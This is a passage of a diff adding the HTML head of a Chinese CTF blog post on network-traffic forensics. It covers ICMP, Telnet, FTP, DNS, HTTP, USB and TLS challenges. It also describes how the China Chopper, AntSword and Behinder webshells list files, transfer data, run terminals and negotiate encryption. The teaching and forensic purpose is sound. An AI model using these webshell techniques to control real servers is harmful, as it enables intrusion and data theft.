@@ -1,0 +1,1119 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>CTF训练营-forensics | 嘻哈磕碜のBlogs</title><meta name="author" content="hihopkc"><meta name="copyright" content="hihopkc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="CTF训练营-forensics"><meta name="application-name" content="CTF训练营-forensics"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="CTF训练营-forensics"><meta property="og:url" content="https://hihopkc.github.io/posts/96d6.html"><meta property="og:site_name" content="嘻哈磕碜のBlogs"><meta property="og:description" content="网络流量分析网络流量分析是指利用分析技术和统计手段对网络数据包进行处理，从而实现对网络的行为分析、性能分析和故障诊断等。它也是网络取证中经常使用的手段。 在几乎所有的CTF 比赛中，都会涉及对网络流量分析能力的考查，尤其是在企业或者行业内部的比赛中，此类题目属于必考题目。这类题目的难度适中，涉及的知"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401151644862.png"><meta property="article:author" content="hihopkc"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401151644862.png"><meta name="description" content="网络流量分析网络流量分析是指利用分析技术和统计手段对网络数据包进行处理，从而实现对网络的行为分析、性能分析和故障诊断等。它也是网络取证中经常使用的手段。 在几乎所有的CTF 比赛中，都会涉及对网络流量分析能力的考查，尤其是在企业或者行业内部的比赛中，此类题目属于必考题目。这类题目的难度适中，涉及的知"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="https://hihopkc.github.io/posts/96d6"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/swiper/swiper.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: undefined,
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"tianli","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"00af80c1b4c617346c21","Referer":"https://hihopkc.github.io/"},
+  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
+  LA51: undefined,
+  greetingBox: undefined,
+  twikooEnvId: 'https://hihopkc.space/',
+  commentBarrageConfig:undefined,
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: {"apiurl":"https://www.hihopkc.site/"},
+  navMusic: false,
+  mainTone: undefined,
+  authorStatus: {"skills":null},
+  algolia: {"appId":"R27EJ0K44Q","apiKey":"2631264c2276b5498f37a67d587bc878","indexName":"Demo","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    simplehomepage: true,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hihopkc","link":"链接: ","source":"来源: 嘻哈磕碜のBlogs","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
+  lightbox: 'mediumZoom',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#425AEF","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: '嘻哈磕碜のBlogs',
+  title: 'CTF训练营-forensics',
+  postAI: '',
+  pageFillDescription: '网络流量分析, 网络协议的基础知识, CTF流量分析的通用方法, ICMP, 例题fetus_pcap.pcap, Telnet, 例题packet2.pcapng, 04Networking, 08Telnet用户密码抓取, 46telnet_cmd, FTP, 09FTP, 17WhyNotSftp, 20leaks-suspected, 40ftp-data, 41ssPacket, 50fftp, DNS, 例题DNS.pcap, 05Dns, Httpx2FHttps, 02Http, 03Forensics-Four Eyes, 12tribalwars账户密码, 19Espionage, 23digital-camouflage, 38HTTP头, 48file_upload, 考点2：菜刀、蚁剑流量分析, （1）列目录, （2）上传文件, （3）下载文件, （4）虚拟终端, （5）解题技巧, 例题packet3.pcapng, 例题yijian.pcapng, 06菜刀, 15菜刀密文抓取, 34Webshell, 考点 3冰蝎流量分析, 1)密钥传递阶段。, 2)算法协商阶段。, 3)加密通信阶段。, 例题bingxie.pcapng, USB, 例题key.pcap, 例题mice.pcap, 11USB, 37usbcatch, TLS, 例题TheGreatEscape.pcapng, 例题transcript.zip, 13SSL Sniff, 24greatescape, 35ssl-sniffer2, Smpt, 01Smtp, 42smtp_cotent, 43smtp_attachment, 44http_smtp, 45ftp-smtp, 其他, 10510-数据包分析-密码获取, 10514-数据包分析-transfer, 10516-数据包分析-BigData, 10518-数据包分析-Intercepted Post, 10521-数据包分析-No_Big_Deal, 10522-数据包分析-easycap, 10525-数据包分析-first-contact, 26voip, 10527-数据包分析-in-recorded-conversation, 10528-数据包分析-private, 10529-数据包分析-iSpy, 10530-数据包分析-WatchMeSurfTheInternet, 10531-数据包分析-john-in-the-middle, 10532-数据包分析-lolteam, 10533-数据包分析-Crack_this, 10536-数据包分析-weirdshark, 10539-数据包请求-SecretFile, 10547-数据包分析-SString, 10549-数据包分析-nfs, 取证分析-analysis, 取证分析-babypcap网络流量分析网络流量分析是指利用分析技术和统计手段对网络数据包进行处理从而实现对网络的行为分析性能分析和故障诊断等它也是网络取证中经常使用的手段在几乎所有的比赛中都会涉及对网络流量分析能力的考查尤其是在企业或者行业内部的比赛中此类题目属于必考题目这类题目的难度适中涉及的知识面广泛能有效结合企业内部的业务因此建议各位读者重点关注并熟练掌握进行网络流量分析需要掌握多方面的知识不仅涉及杂项知识还需要结合渗透等方面的基础知识网络协议的基础知识网络协议是为在网络中进行数据交换而建立的规则标准或约定的集合通常也简称为协议互联网的核心是一系列协议总称为互联网协议它们对计算机如何连接和组网做出了详尽的规定一个协议通常只为一个目的而设计那么应该如何设计网络协议呢阿帕网是美国国防高级研究计划局开发的世界上第一个运营的数据包交换网络是全球互联网的鼻祖但是无法和使用不同操作系统的计算机进行网络交流这引发了研究者的思考的研制经验表明对于非常复杂的网络协议其结构应该是层次式的年国际标准化组织发布了标准它定义了网络互连的层框架也就是开放式系统互连参考模型层次说明应用层体系结构中的最高层是网络服务与最终用户的一个接口表示层实现数据的表示压缩和安全性会话层建立管理终止会话传输层运输层定义传输数据的协议端口号以及流量控制和差错校验等网络层网际层进行逻辑地址寻址实现不同网络之间的路径选择数据链路层实现建立逻辑链路物理地址寻址差错校验等功能物理层利用传输介质为数据链路层提供物理连接实现比特流的透明传输期望达到一种理想境界即全球网络都遵循这个统一的标准因此在标准制定的过程中试图涵盖当时最先进的技术导致制定周期漫长当标准还在讨论时一种新的网络协议在工业界被广泛采纳而且被众多厂商使用这就是于是面临着非常尴尬的局面大公司和厂商都认可但几乎找不到厂商能生产出符合标准的商用产品而基于的互联网已抢先在全球大范围运行成为事实上的国际标准传输控制协议网际协议包含应用层传输层也称为运输层网络层也称为网际层和网络接口层但在学习计算机网络原理时往往采取折中的方法综合和的优点采用一个五层协议的体系结构这样的体系结构称为协议栈不同协议栈的体系如下图所示有了协议栈的概念我们就可以描述主机之间是如何通信的如图所示主机均有自己的网络协议栈向发起请求需要使用协议栈中各层提供的服务图中的客户端程序和服务端程序都可以看作进程若仅考虑进程之间的交互则可以看作虚线表示的连接对于相应的协议我们可以按照下面的描述简单理解网络层的协议头部会保存要连接的主机的地址传输层的或的头部会保存端口信息地址可以确定连接的主机但不能确定是哪个进程端口信息可以确定和哪个进程完成信息交互流量分析的通用方法打开离线流量文件后可以先观察一下分组数如果分组数小于个可以手工逐个数据包查看因为当数据包个数较少时协议分级的效果并不明显而且如果题目的分组数较少说明考点较为直接杂包过滤可能并不是重点如果分组数较多通过协议分级可以看到各协议所占的比例如果流量中存在等明文传输协议建议通过追踪流或过滤的方法优先查看这些协议的通信过程如果没有上述协议而是存在大量的所谓大量一般是指字节数占比较大那么就是接下来分析的重点通过统计请求工具可以查看所有的详细信息对于一般的流量通过就可以看到所有请求的资源如果是注入攻击流量在中会有大量的特征如果是菜刀蚁剑等工具生成的流量会存在大量的包通过逐个查看请求的返回包也可以掌握通信过程关于的详细分析方法会在后面内容中说明如果离线文件中均无上述协议就需要结合题目的描述进行针对性分析例如若题目中存在大量协议就需要重点关注查询的域名以及对该域名的响应假如存在协议则需要结合协议载荷判断设备类型再根据设备通信规则复原出传输的信息也称为控制报文协议它允许主机或路由器报告差错情况并提供有关异常的报告这些控制消息虽然不传输用户数据但是对于用户数据的传递起着重要作用需要注意的是并不是高层协议它和同属于网络层但是报文封装到数据报中报文如图所示它的报文头部为字节定义如下比特类型比特代码比特校验和标识符一般用进程号作为标识符用于匹配和包报文序列号用于标记报文顺序时间戳或未使用的一个重要应用是分组网间探测它可以用于测试两个主机之间的连通性使用了回送请求与回送回答报文报文如下所示不难发现数据部分可以用来传输消息不同操作系统的数据部分的填充方法略有区别在系统下采用小写字母循环在系统下使用选项可以指定发送的数据默认是的循环此时读者们应该能想到的一种出题方法就是在数据部分隐藏将编码或者加密后经请求包传输这个考点较为简单在发现数据部分异常后就转化为上节介绍的常见编码的问题数据部分明文传输的相关题目比较简单为了增加比赛难度一些出题人会想出新的考点的另一个考点是以数据部分的长度表示要传输的信息其本质是基于文本的信息隐藏例题不久前运维人员在日常安全检查的时候发现现场某设备会不时向某不知名发出非正常的包这引起了运维人员的注意他在过滤出包分析并马上开始做应急处理很可能已被攻击的设备运维人员到底发现了什么形式为流量分析题分析的方法基本上有查找一些可疑字符串或进制数据排序流量包的长度最长的流量包一般很可疑当我们对流量包的长度进行排序时发现流量包最短字节最长也不过字节其中的段数据长度从到而表中第至个字符为于是将每个流量包的长度转换为对应字符然后连接成一段长字符串看上去像编码对字符串进行解码即可是远程登录服务的标准协议和主要方式为用户提供了在本地计算机上远程管理主机的能力实际上的出现早于协议簇的其他应用层协议它默认端口号为的一个特点是以明文方式传输所有数据这也意味着如果捕获了网络流量就可能找到远程登录的用户名和密码作为一种不安全的远程登录协议几乎被协议所替代只有在某些场景下才会使用远程登录有四种工作模式这里重点介绍两种第一种是一次一字符模式当用户输入命令时每按一个键客户端会立刻把该字符发送给远程服务器然后从连接上读取收到的字符返回给客户端显示给用户看大部分默认采用这种工作模式第二种是准行模式用户每键入一行信息客户端向服务器发送一次信息的考点主要是获取用户登录时的正确密码通常采用一次一字符模式进行传输下面举例说明例题从流量中找到解题思路协议分级后发现协议将其过滤出来选择追踪流红色字段是客户端向服务器发送的数据蓝色字段是服务器向客户端发送的数据在也就是用户名输入时我们发现客户端每发一个字符服务端就把这个字符再发一遍符合一次一字符模式的传输特征字段中有一些这其实是不可打印字符选择为转储可以看到客户端输人了字符这个字符是也就是删除这意味着用户在输入过程中删除了一些字符那么如何确定删除了多少个字符一个简单的方法是看客户端发了多少个所以本题中正确的密码是来源题目类型分数难度易描述随便点击一条数据右键追踪流用户密码抓取找到这个会话的账户和密码格式黑客通过进入了我的电脑你知道他找到了什么机密信息吗即文件传输协议是协议组中的协议之一协议包括两个组成部分其一为服务器其二为客户端其中服务器用来存储文件用户可以使用客户端通过协议访问位于服务器上的资源在开发网站的时候通常利用协议把网页或程序传到服务器上此外由于传输效率非常高在网络上传输大的文件时一般也采用该协议默认情况下协议使用端口中的和这两个端口其中用于传输数据用于传输控制信息但是是否使用作为传输数据的端口与使用的传输模式有关如果采用主动模式那么数据传输端口就是如果采用被动模式则具体最终使用哪个端口要服务器端和客户端协商决定命令由个字母组成命令后面跟参数用空格分开每个命令都以结束常用的命令有等各命令含义如下指定用户名通常是控制连接后第一个发出的命令表示以用户名登录指定用户密码该命令紧跟在命令后表示密码为从服务器上返回指定文件的大小表示如果文件存在则返回该文件的大小改变工作目录如让服务器在数据端口监听进入被动模式如告诉服务器客户端监听的端口号让服务器采用主动模式连接客户端如下载文件表示下载文件上传文件表示上传文件该命令并不传送文件而是忽略指定点后的数据此命令后应该跟其他要求文件传输的命令比如表示重新指定文件传送的偏移量为字节关闭与服务器的连接获取密码进行提交首先输入进行过滤得到很认真为什么不呢名称暗示了的使用情况所以让我们通过在过滤器框中输入来过滤协议上的数据包捕获点击标号为的捕获单击底部的另存为按钮并将其另存为文件解压文件然后打开里面的它显示发现重要的文件被攻击者泄露攻击者无法删除日志分析损坏的文件并查找泄露的文件格式打开后发现不可以发现那我直接这是什么呢十六进制所以我们捕获了一个数据包找到他传输的数据导出对象黑客通过下载了一个加密压缩文件试着找到解压密码并打开它格式然后筛选一下小黑用下载了一个却没有你帮他找到导出对象然后打开搜索协议簇中使用地址和端口号来确定网络上某一台主机中的某一个服务那么为什么不用域名来直接进行通信呢因为地址的长度是固定的而域名的长度是可变的可变的域名不便于计算机处理而地址对于用户来说不方便记忆但域名便于用户使用总结来说就是地址是面向主机的而域名是面向用户的也称为域名系统是将域名和地址相映射的一个分布式数据库能够让用户更方便地访问互联网协议运行在之上默认端口号是下面是域名查询的一个例子表示查询是对查询的响应是会话标识因为大部分报文是基于的通过会话标识可以区分应答报文是对哪个请求的响应图中查询的域名是查询到的地址是对的解析结果见下图下图解析了查询响应报文下面给出的是查询的域名下面给出的是域名对应的地址本例中共查询到个地址例题从流量中找到解题思路通过查询协议分级信息结合题目名称发现报文数据量比较大考虑重点查看在显示过滤器中输入后还能看到一些报文修改过滤规则为把报文过掉过滤出来的第一个数据包查询的域名为这个域名有明显的问题考虑把同一个地址请求的都过滤出来新的过滤规则是可以发现这个地址把每个异常域名都请求了次把所有可疑域名提取出来去除所有的重复项仅保留一个再拼接到一起就得利用解码和解码得到把可疑包的信息进行整理收集以后得出即也称为超文本传输协议是一种用于分布式协作式和超媒体信息系统的应用层协议是万维网的数据通信的基础服务端和客户端的信息传输都会通过进行加密所以传输的数据都是加密后的数据题目数据包分析描述请根据题目去下载相应的数据包对其进行分析得到格式导出对象首先过滤一下找到包账户密码根据所给的数据包分析出网站账户和密码找到包来源题目类型分数难度难描述我们怀疑我们的一名员工正在向竞争对手出售秘密我们还没有抓到他但我们确实设法嗅一些交通你能找出发生了什么事吗为小写字符串导出对象按照大小排列可以看到然后我们右键导出分组字节流发现压缩包里面有个音频怀疑是音频隐写可以看到获取数据包中用户登录的密码头据说请求头能藏很多东西找到小黑客登录我的网站试图通过文件上传攻击我的网站你知道他上传了什么吗导出对象考点菜刀蚁剑流量分析中国菜刀简称菜刀是一个网站管理程序通过在网站中预先植人木马再利用菜刀和木马建立连接从而达到攻击的目的菜刀体积小可提供文件下载目录管理虚拟终端等功能受众多用户的喜爱但是由于开发时间久远越来越不能满足需求而且缺少团队维护因此现在白帽黑客更倾向于使用蚁剑蚁剑的英文名为是一款开源的跨平台网站管理工具它主要供具有合法授权的渗透测试安全人员以及进行常规操作的网站管理员进行安全管理之用菜刀流量的特点是通过中的方法和木马后门建立连接如图所示其中是一句话木马数据包中的内容经过编码后一般如下这段代码需要执行语句需要先用解码才能运行解码后的结如下临时关闭的错误显示功能防止上传文件超时关闭魔术引号在之后基本不使用获取当前路径获取磁盘信息获取服务器操作系统信息获取当前用户退出当前脚本服务器返回的数据包不再进行编码可以看到明文的返回结果可以发现脚本确实被运行一般菜刀连接后的第一个包都会获取上述信息接下来我们针对菜刀常见的列目录上传下载虚拟终端等功能做详细分析列目录列目录是吧某个路径下的文件和文件夹遍历输出解码后的实体如下脚本的主要逻辑是对进行解码遍历解码后路径下的全部内容代码打开指定目录的句柄然后进行循环扫描并附带名称时间大小日期这四个参数用拼在一起发送回客户端解码后的内容是表示会把盘根目录下的所有内容列出来列目录是经常用到的功能在流量中不会改变则根据目录的不同而变化上传文件上传文件的流量比较有特点首先是有个参数解码后的流量特征如下解码后的结果如下利用函数把数据写到解码后的路径中如果写文件成功就返回否则返回经过编码提取出的数据就能获上传的文件解码后的路径是需要特别说明的是文件上传完成后菜刀会再做一次列目录操作在列目录的返回包中就能看到文件下载文件下载文件也是菜刀经常用到的功能其数据包的特点是文件路径明文显示没有被编码具体如下解码后的结果是返回包以明文的方式包含上述指令打印的前缀和要下载的文件需要注意的是如果要从流量中提取出菜刀工具下载的文件一定要删除菜刀代码添加的前缀否则文件不能正常打开虚拟终端虚拟终端是菜刀中一个非常实用的功能就像攻击者获取了服务器一样使得攻击者可以完成交互获得更多的信息和操作虚拟终端的流量如下这段载荷有个参数但是第个参数几乎总是可以作为虚拟终端流量的强特征解码后为解码后为解码后为将的值解码后保存到中获取的文件的绝对路径保存到中通过判断绝对路径的第一位来区分和系统本例中的路径是系统路径所以要执行的语句为真正执行的命令为并将结果重定向输出解题技巧目前在比赛中菜刀流量主要考查列目录文件上传下载和虚拟终端等功能我们当然可以逐个把数据包中的内容解码查看代码逻辑但这么做有些烦琐一种更简单的方法是根据包的返回包内容猜测包中代码的功能例题根据协议分级重点查看协议数据包发现都是请求猜测可能是菜刀流量我们首先查看第二个包也就是第一个请求对应的返回包其结果为此时可以确定第一个请求中的代码是为了获取系统信息逐个查看请求的返回包在第个数据包中看到了文件的头部结合第个数据包判断是从服务器下载文件将其导出同理对于第个数据包服务器返回结合第个数包判断是向服务器上传文件将文件导出再经过解码得到一张图片将压缩包解压结合图片信息得到完整的蚁剑的流量特征和菜刀有相似之处都是通过请求发送脚本但是蚁剑做了更多的优化以减少流量特征如图所示在连接木马前可以选择编码器和解码器除了菜刀默认的编码还可以选择等方式不仅请求包可以被编码返回包的数据也可以被编码这增加了分析的难度但是上传和下载的文件不会被编码可以被直接提取例题协议分级后重点关注的协议数据重点分析蚁剑的请求和返回信息图中的请求包采用的方式对传输内容加密并且用分隔多个字段的使用是蚁剑流量的特征之一不难发现返回包的内容也是经过加密的在第个数据包发现了从服务器下载的压缩包将其提取并解压后就能看到菜刀跟例题一样但我要做个补充打开数据包发现抓包文件很小随便找个数据包右击选择跟踪码流根据会话内容很像是菜刀的数据包选择选择档发现存在个会话一个个分析发现其中前个会话是通过菜刀查看目录的一个操作返回部分返回了一个目录中的内容可通过对选中部分先进行解码再进行解码即可看到菜刀执行的代码进而分析其逻辑而第个会话是一个下载文件的会话第个会话是一个上传文件的会话分析第个会话可以看到会话的逻辑是下载一个的文件随后进行了响应将的内容返回给了客户端这里因为服务器在响应时使用了选项所以这里不能直接使用保存数据包中的内容再用提取出来可以是可以但是这种方式保存下来的数据需要自己写个脚本进行处理然后才能用提取文件太麻烦那如何导出文件选择找到我们刚才下载文件会话的返回的那个通过将其保存为文件通过这种方式提取出来的数据会自动帮我们解决采用传输的问题而不需要我们自己去解决通过打开刚刚保存的文件将和之间的数据保存为一个文件解压后发现是一张图片里面有半个和为在传输数据时菜刀加入的内容因为只有半个所以还需要分析上传逻辑首先将菜刀的代码部分进行解码还原出来如图所示很明显是一个上传文件的逻辑这个无法用提取文件只能将菜刀的上传代码稍作修改并在环境下运行即可以得到上传文件菜刀密文抓取导出发现有那我直接就导出对象另存为类型黑客通过往服务器写入了一串机密信息你能找出机密信息吗协议分析是发现是菜刀流量解码后考点冰蝎流量分析无论是菜刀还是蚁剑在流量加密保护方面均存在较大的缺陷为了更好地对流量加密逃避防火墙拦截冰蝎应运而生冰蝎也是一个管理工具它可以在明文协议中建立加密隧道以躲避安全设备的检测我们以版本为例分析冰蝎的协议特征它使用对称加密算法加密过程总共分为三步密钥传递阶段客户端向服务器请求密钥密钥是明文传递的客户端向服务器发起请求以协商密钥请求的中只带一个参数如图所示中的参数是冰蝎连接时的密码等号后的数字是随机生成的密钥位于服务器返回包的实体部分一般是字节的小写字母或数字密协商阶段会发起多个请求可以根据头部字段的值判断使用哪个密钥算法协商阶段冰蝎将一串用不同的算法加密然后发送给服务器如果服务器成功解密那么接下来的通信就使用这种算法如果算法不对则解密失败那么响应为空冰蝎会更换另一种加密算法进行尝试直到成功为止加密算法一般为模式和异或加密两种加密采用相同的密钥如果使用加密则为全图展示了算法协商过程当服务器采用某种加密算法不能解密客户端的数据时服务器会把字段置为当客户端收到这样的返回值后会采用另一种加密算法再发送一次加密通信阶段客户端使用上述密钥和算法加密后通过请求将脚本发送给服务端服务端解密后执行并将结果以相同密钥和加密算法返回给客户端例题打开文件后进行协议分级重点关注我们发现有两个是请求其余都是请求结合的特征判断可能是冰蝎流量根据第个数据包的值可以发现采用第次协商的密钥由于加密算法未知因此可以把加密和异或加密都尝试一遍利用脚本和分别对其解密发现采用的是异或加密利用异或解密脚本分别对请求包解密也就是题目中第个数据包需要根据不同数据包的内容修改脚本中对应的值对第个数据包解密后将其中的数据解码可看到图的内容结合代码逻辑可知是向服务器上传了文件文件内容经编码后存储在的变量中将解码得到压缩包解压后就得到的全称是通用串口总线流量指的是设备接口的流量攻击者能够通过监听接口流量获取键盘敲击键鼠标移动与点击存储设备的明文传输通信无线网卡网络传输内容等信息在比赛中流量分析主要以键盘和鼠标流量为主上图显示的是从本地机器捕获的接口流量需要注意的是伪头不属于发送内容部分而是控制程序的部分后面的部分才是真正要发送或接收到的内容在这个例子中就是占字节真正发送的内容是中的字节键盘和鼠标传输的内容就在中键盘数据包的数据长度为字节击键信息集中在第个字节这个字节并不是字符的码具体映射关系需要查看第页的内容鼠标移动时表现出连续性但实际上鼠标动作所产生的数据包是离散的每一个数据包的数据区有个字节第个字节代表按键值为时表示没有按键值为时表示按左键值为时表示当前按键为右键第个字节可以看成一个类型其最高位为符号位当这个值为正时代表鼠标水平右移多少个像素这个值为负时代表鼠标水平左移多少个像素第个字节与第个字节类似代表鼠标垂直移动的像素数得到这些信息后即可恢复出鼠标移动轨迹针对键盘和鼠标的流量分析可以使用开源工具和完成这两个工具可以从流量包中读出击键内容并恢复出鼠标轨迹例题很明显的键盘流量例题很明显的鼠标流量打开数据包文件后从协议可以发现这应该是一个的数据包找到此设备的回复数据包在详情中可以这个设备应该是一个罗技光电鼠标自己观察每个数据后可以发现这个数据包应该是代表着鼠标的移动因为它的值在不断的变化第二个字节代表轴的移动而第三个字节则代表在轴的和之间的运动我们假设这些值确实是鼠标的移动产生的接下来我们用导出这些数据然后我们需要将第二个和第三个字节转换为坐标可以使用以下命令具体命令的意思可以查看的一些知识注意使用函数时需要安装在里面直接运行即可安装然后我们使用将这些数据绘制成图片即可注意此时的图片可能是颠倒过来的放到中将其垂直翻转即可有个小偷从我的电脑里一个秘密文本找到他可以看到的内容是一种密码通信框架也是目前使用最广泛的密码通信方法综合运用了密码学中的对称密码消息认证码公钥密码数字签名伪随机数生成器等算法安全套接层是年由公司设计的一套协议并于年发布了版本安全传输层是在基础上设计的协议相当于的后续版本协议位于传输层和应用层之间其功能是一个加密通道和上层应用协议无关由于采用明文传输很容易被攻击者窃听或者篡改内容通过引入对的内容进行加密等操作可以有效防止窃听篡改和劫持等如下图所示在比赛中关于的考点并不是很多当没有私钥时因为无法对加密流量进行解密所以协议一般不是我们关注的重点但是有一类题目会提供的私钥这就需要我们在中导入私钥从而解密相关流量例题格式为首先看到协议分级里面有经过分析发现向服务器上传了文件然后将文件导出打开发现是私钥文件题目的意思应该是让我们导入私钥文件利用会话统计功能发现有大量端口的连接猜测可能是协议单击编辑工具栏选择最下方的首选项打开后在窗口左侧选择再选择单击旁边的按钮单击左下角的按钮新增一项各字段按下图填写其中地址可以空缺会自动选择相应的流解密填写因为要解密故填写解密后的应用层协议是提取出的私钥的保存路径如果知道证书的加密密钥就填写到字段一般情况下可以不填单击右下角的按钮会使用该私钥对相关流量自动解密输入过滤规则单击过滤出的第一个数据包展开解析结果可以看到当没有导入私钥时输入上述过滤规则则没有任何数据包满足过滤条件说明导入的私钥被正常用于解密除了使用私钥在中预主密的作用至关重要无论是加密算法还是密钥交换算法最终都是为了交换或者协商出通过结合其他参数可计算出作为整个会话的密钥因此如果比赛题目提供了或者在中直接导人在处选择合适的文件就可以完成解密这里我们不讨论解密算法的细节例题在处导人题目提供的文件单击按钮后并没有直接解密选中一个协议的数据包选择追踪流可以看到结果我们收到了的请求的网络捕获文件尝试找到罪魁祸首我们得到一个包含加密对话的捕获幸运的是密钥隐藏在证书的字段中分析该数据包你会有三部分事情要做先找出再找到加密传输的跟例题一样在电子邮件中发现的两个地址指向所以这可能是我们正在寻找的正确的地址要确认请查看在文件中是否有来自的任何流量你会看到加密的流量让我们使用从协议和私钥收集的所有信息来解密流量允许解密流量插入在编辑首选项使用过滤器你可以看到解密的流量我们收到了一个请求的数据包我们知道实际的请求有有用的信息私钥跟例题一样导入对抓包分析协议分析之找到数据包中的敏感字符拿到其密文敌军有可能正在进行一项秘密交易找到他们交易的证据因为是明文传输我们捕获到一些可疑的数据包可能存在邮件的附件中找到他张三下了加密的压缩包却没有解压密码李四通过邮箱给发了消息帮他解决这个问题首先导出对象解压密码为小黑通过下载加密压缩包李四邮件发给他密码截获他们的网络流量找到一样的道理其他数据包分析密码获取选择第一条数据包乍一看好像是答案但是对应的是嘛呢原来是表示的是回车数据包分析我嗅了一段时间的网络流量我想我终于有了一些有趣的事情帮助我通过所有这些数据包找到标志搜索追踪解码脚本数据包分析东西东西数据东西东西大数据数据包分析我们拦截了你父亲的一些网络活动你能从他的交通中得到一个密码吗数据包分析有时答案很明显有时会被掩盖找到答案数据包分析这是一道送分题你能从包捕获中得到这个吗追踪第一个包数据包分析机器人正在与坠毁的船舶通信您的目标是通过检查网络流量来查找船舶的位置格式提取语音标志格式是点击电话通话这个电话尽管是一个机器人的声音很难解释数据包分析追踪一下数据包你能找到吗数据包分析你是安静的你能够听到的越多查看传输中使用的协议我们看到一堆和其他一些请求单个的请求并不能告诉我们我们的标志在哪里然而经过一些摆弄数据之后我们注意到数据包的所有层的标识符都在值范围之内最值得注意的是当只查看从到的请求时开始拼写这里是你的标志要查看标志您可以在中应用过滤器并向下滚动请求以注意标识符字节中的标志或者你可以使用和中提到的过滤器的偏移范围包含标识符数据包分析我们截获了一些可疑的网络活动我们认为敌人一直在交换重要的数据你能帮我们弄清楚它是什么吗数据包分析从目录中的文件获取在与或交谈时我们注意到没有什么突出的但是作者在某些请求的源端口中隐藏了该标志有几个请求来自诸如或者之类的端口都略微超过了如果从这些端口中减去一个你将得到一个十进制的字符串数据包分析约翰能劫持你的吗数据包分析有一个叫做的可疑团队我把目光投向了他们一段时间并且在他们改变密码的时候我设法窃听他们的浏览器他们将密码更改为什么数据包分析这是一道送分的流量分析你能找到吗只有一个包数据包分析找到一个修复的数据包你能分析出吗导出对象数据包请求我们捕获了一个黑客的网络活动你能知道他在干什么吗数据包分析阿黑收到一串奇怪的数字他在网上找了加密算法但他不会于是发邮件请教好友你能帮他呢解出来吗分析题意可知小黑是浏览了解密算法但他不会于是过滤出请求导出对象但是我们没有密文继续找到小黑的邮件过滤出数据包分析小白在局域网分享了一个文件小黑花了不到几秒钟就找到了根据题意过滤出文件共享数据包简单分析出小黑的是于是我们过滤出从小白的向小黑的电脑传输的数据逐帧分析在倒数第二帧发现了可疑的数据加密内容取证分析证据在权限里为内的内容字符串无前缀题目名称为我们知道通常以形式上传猜测为分析一下前面只是登录尝试后面是列目录取证分析',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-01-15 16:44:39',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
